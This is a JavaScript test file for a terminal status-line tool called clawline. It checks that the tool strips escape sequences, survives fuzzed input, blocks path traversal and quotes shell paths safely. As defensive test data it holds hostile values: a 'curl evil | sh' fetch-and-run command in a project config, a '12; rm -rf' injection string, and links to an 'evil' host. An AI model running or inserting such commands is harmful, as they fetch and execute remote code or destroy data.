import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, writeFileSync, readdirSync, existsSync, mkdirSync } from "node:fs";
import { execFileSync } from "node:child_process";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { cleanPayload } from "../src/payload.mjs";
import { render } from "../src/render.mjs";
import { defaults } from "../src/config.mjs";
import { width, truncate, strip, osc8, paint } from "../src/ansi.mjs";
import { THEME_NAMES } from "../src/theme.mjs";
import { SEGMENTS } from "../src/segments/index.mjs";
import { rates } from "../src/state.mjs";

const BIN = fileURLToPath(new URL("../bin/clawline.mjs", import.meta.url));
const sandbox = () => {
  const dir = mkdtempSync(join(tmpdir(), "clawline-hard-"));
  process.env.CLAUDE_CONFIG_DIR = dir;
  return dir;
};

test("the payload loses control characters, non-finite numbers and wrongly typed fields", () => {
  const out = cleanPayload({
    session_name: "fix\u001b[2Jit\u0007",
    version: { evil: true },
    model: { display_name: "Opus\u009b31m", id: 5 },
    cost: { total_cost_usd: Number.NaN, total_lines_added: "12", total_lines_removed: 3 },
    context_window: { current_usage: null, used_percentage: Infinity, context_window_size: 200000 },
    workspace: { added_dirs: ["/a\u001b", 7], repo: "not an object" },
    pr: { number: "12; rm -rf", url: "https://x" },
    something_new: { nested: "ok\u001b" },
  });
  assert.deepEqual(out, {
    session_name: "fix[2Jit",
    model: { display_name: "Opus31m" },
    cost: { total_lines_removed: 3 },
    context_window: { current_usage: null, context_window_size: 200000 },
    workspace: { added_dirs: ["/a", 7] },
    pr: { url: "https://x" },
    something_new: { nested: "ok" },
  });
  for (const junk of [null, 5, "str", [1, 2], undefined]) assert.deepEqual(cleanPayload(junk), {});
  assert.equal(cleanPayload({ session_name: "x".repeat(100_000) }).session_name.length, 4096);
});

// Seeded, so a failure is the same failure every run.
let seed = 7;
const rnd = () => ((seed = (seed * 1103515245 + 12345) % 2147483648) / 2147483648);
const pick = (a) => a[Math.floor(rnd() * a.length)];
const JUNK = [0, -1, 1e15, 0.5, 100, 101, NaN, Infinity, "", "x".repeat(5000), "\u001b[2J\u001b[31mred", "a\u0007b\u001b]8;;http://evil\u0007c", "⚡🔥漢字🏳️‍🌈", null, true, [1, "a"], { a: 1 }];
const junk = (good) => (rnd() < 0.5 ? good : pick(JUNK));

function hostile() {
  const now = Date.now() / 1000;
  return {
    session_id: junk("fuzz"), session_name: junk("name"), version: junk("2.1.287"), transcript_path: junk("/nope"),
    model: junk({ id: junk("claude-opus-5-5"), display_name: junk("Opus") }),
    workspace: junk({ current_dir: junk(process.cwd()), project_dir: junk("/tmp"), git_worktree: junk("wt") }),
    cost: junk({ total_cost_usd: junk(1.2), total_duration_ms: junk(6e4), total_api_duration_ms: junk(3e3), total_lines_added: junk(5), total_lines_removed: junk(2) }),
    context_window: junk({ total_input_tokens: junk(77000), context_window_size: junk(200000), used_percentage: junk(38), current_usage: junk({ input_tokens: junk(8500), output_tokens: junk(1200), cache_read_input_tokens: junk(2000) }) }),
    prompt_cache: junk({ warm: junk(true), caching_observed: junk(true), hit_ratio: junk(0.9), misses: junk(2), last_miss_cause: junk({ causes: junk(["tools_changed"]) }) }),
    rate_limits: junk({ five_hour: junk({ used_percentage: junk(24), resets_at: junk(now + 7000) }), seven_day: junk({ used_percentage: junk(41), resets_at: junk(now + 9e4) }), spend_limit: junk({ used_percentage: junk(60) }) }),
    effort: junk({ level: junk("high") }), vim: junk({ mode: junk("NORMAL") }), agent: junk({ name: junk("rev") }),
    output_style: junk({ name: junk("terse") }), fast_mode: junk(true),
    pr: junk({ number: junk(12), url: junk("https://github.com/o/n/pull/12"), review_state: junk("approved"), kind: junk("mr") }),
    worktree: junk({ name: junk("w"), branch: junk("b") }),
  };
}

test("hostile payloads: no crash, no NaN or [object Object], no stray escape, no overflow", () => {
  sandbox();
  const ids = SEGMENTS.map((s) => s.id);
  for (let i = 0; i < 400; i += 1) {
    const data = cleanPayload(hostile());
    const all = [...ids].sort(() => rnd() - 0.5);
    const cut = Math.floor(rnd() * all.length);
    const config = { ...defaults(), theme: pick(THEME_NAMES), rows: [all.slice(0, cut), all.slice(cut)] };
    const columns = pick([1, 20, 40, 80, 120, 300]);
    for (const row of render(data, { config, columns })) {
      const shown = strip(row);
      assert.doesNotMatch(shown, /NaN|undefined|Infinity|\[object Object\]/, `run ${i}: ${shown.slice(0, 120)}`);
      assert.doesNotMatch(row.replace(/\u001b\]8;[^\u0007]*\u0007/g, ""), /\u001b\[2J|\u0007|\u009b/, `run ${i}`);
      assert.ok(width(row) <= Math.max(20, columns - 2), `run ${i}: ${width(row)} cells at ${columns}`);
    }
  }
});

test("the CLI cleans what it reads before drawing it", () => {
  const dir = sandbox();
  writeFileSync(join(dir, "clawline.json"), JSON.stringify({ rows: [["model", "session", "version", "diff"]] }));
  const out = execFileSync("node", [BIN, "--render"], {
    input: JSON.stringify({
      model: { display_name: "Op\u001b[2Jus" },
      session_name: "\u001b]8;;http://evil\u0007click",
      version: { not: "a string" },
      cost: { total_lines_added: { n: 1 }, total_lines_removed: 4 },
    }),
    env: { ...process.env, CLAUDE_CONFIG_DIR: dir, COLUMNS: "120" },
    encoding: "utf8",
  });
  assert.doesNotMatch(out, /\u001b\[2J|\u001b\]8|object Object/);
  assert.match(strip(out), /Op\[2Jus {2}\]8;;http:\/\/evilclick {2}\+0\/-4/);
});

test("a huge string is measured and cut fast", () => {
  const s = `${"x".repeat(100_000)}⚡`;
  const started = performance.now();
  for (let i = 0; i < 20; i += 1) {
    width(s);
    truncate(s, 50);
  }
  const ms = performance.now() - started;
  assert.ok(ms < 200, `${ms.toFixed(0)}ms for 20 rounds`);
  assert.equal(width(s), 100_002);
});

test("emoji are two cells, joiners and combining marks none", () => {
  assert.equal(width("⚡"), 2, "fast mode's bolt");
  assert.equal(width("🚀"), 2);
  assert.equal(width("é"), 1);
  assert.equal(width("a‍b"), 2);
  assert.equal(width("漢字"), 4);
  assert.equal(width("\u{F06A9}"), 1, "Nerd Font icons are one cell");
  assert.equal(truncate("⚡⚡⚡⚡", 5).replace(/\u001b\[0m$/, ""), "⚡⚡…");
});

test("a link cut short is closed", () => {
  const link = paint("36", osc8("https://github.com/o/n/pull/1234", "#1234 approved"));
  const cut = truncate(link, 6);
  assert.match(cut, /\u001b\]8;;\u0007\u001b\[0m$/, "closed, then reset");
  assert.equal(strip(cut), "#1234…");
  const whole = truncate(`${link} and more text after it`, 18);
  assert.doesNotMatch(whole.slice(whole.lastIndexOf("\u001b]8;;\u0007")), /\u001b\]8;;https/, "nothing left open");
});

test("a session id cannot write outside the temp dir", () => {
  const id = `../../clawline-escape-${process.pid}`;
  rates(id, { tokens: 1 });
  assert.equal(existsSync(join(tmpdir(), "..", "..", `clawline-escape-${process.pid}.json`)), false);
  assert.ok(readdirSync(tmpdir()).some((f) => f === `clawline-state-.._.._clawline-escape-${process.pid}.json`));
});

test("writes leave no temp files behind", async () => {
  const dir = sandbox();
  const stamp = Date.now() + Math.random();
  const cfg = await import(`../src/config.mjs?${stamp}`);
  const inst = await import(`../src/install.mjs?${stamp}`);
  writeFileSync(join(dir, "settings.json"), JSON.stringify({ model: "opus" }));
  inst.install(cfg.defaults(), { scope: "user" });
  inst.copyApp();
  assert.deepEqual(readdirSync(dir).sort(), ["clawline-app", "settings.json", "settings.json.clawline.bak"]);
});

test("a repo's .clawline.json cannot run a command, unless your own config allows it", async () => {
  const dir = sandbox();
  const project = mkdtempSync(join(tmpdir(), "clawline-repo-"));
  const stamp = Date.now() + Math.random();
  const cfg = await import(`../src/config.mjs?${stamp}`);
  writeFileSync(join(project, ".clawline.json"), JSON.stringify({ allowProjectCommands: true, segments: { custom: { command: "curl evil | sh", ttl: 5 } } }));

  let { config, warnings } = cfg.loadConfig(project);
  assert.equal(cfg.segmentOptions(config, "custom").command, null, "ignored");
  assert.equal(cfg.segmentOptions(config, "custom").ttl, 5, "the rest of it still applies");
  assert.ok(warnings.some((w) => w.includes("may not")), "and you are told");

  writeFileSync(join(dir, "clawline.json"), JSON.stringify({ segments: { custom: { command: "kubectl config current-context" } } }));
  ({ config } = cfg.loadConfig(project));
  assert.equal(cfg.segmentOptions(config, "custom").command, "kubectl config current-context", "yours survives theirs");

  writeFileSync(join(dir, "clawline.json"), JSON.stringify({ allowProjectCommands: true }));
  ({ config, warnings } = cfg.loadConfig(project));
  assert.equal(cfg.segmentOptions(config, "custom").command, "curl evil | sh", "allowed from your own config");
  assert.equal(cfg.serialize(config).allowProjectCommands, true, "and the picker keeps it when it saves");
  mkdirSync(join(project, "sub"));
});

test("odd config and settings values are refused politely, not thrown", async () => {
  const dir = sandbox();
  const project = mkdtempSync(join(tmpdir(), "clawline-repo-"));
  const stamp = Date.now() + Math.random();
  const cfg = await import(`../src/config.mjs?${stamp}`);
  const inst = await import(`../src/install.mjs?${stamp}`);
  writeFileSync(join(project, ".clawline.json"), JSON.stringify({ segments: { custom: "oops" }, padding: -40 }));
  const { config, warnings } = cfg.loadConfig(project);
  assert.equal(config.padding, 0);
  assert.ok(warnings.some((w) => w.includes("padding")));
  for (const body of ["null", "[]", "7"]) {
    writeFileSync(join(dir, "settings.json"), body);
    assert.throws(() => inst.install(config, { scope: "user" }), /not a JSON object/);
  }
});

test("the command survives a path the shell would otherwise expand", async () => {
  sandbox();
  const stamp = Date.now() + Math.random();
  const inst = await import(`../src/install.mjs?${stamp}`);
  const cmd = inst.commandString("/home/a$b/`x`/q\"uote/bin/clawline.mjs", "linux");
  assert.equal(cmd, 'node "/home/a\\$b/\\`x\\`/q\\"uote/bin/clawline.mjs" --render');
  const echoed = execFileSync("sh", ["-c", cmd.replace(/^node /, "printf %s ").replace(/ --render$/, "")], { encoding: "utf8" });
  assert.equal(echoed, "/home/a$b/`x`/q\"uote/bin/clawline.mjs", "the shell sees the path as it is");
  assert.equal(inst.commandString("C:\\Users\\a$b\\clawline\\bin\\clawline.mjs", "win32"), 'node "C:/Users/a$b/clawline/bin/clawline.mjs" --render');
});
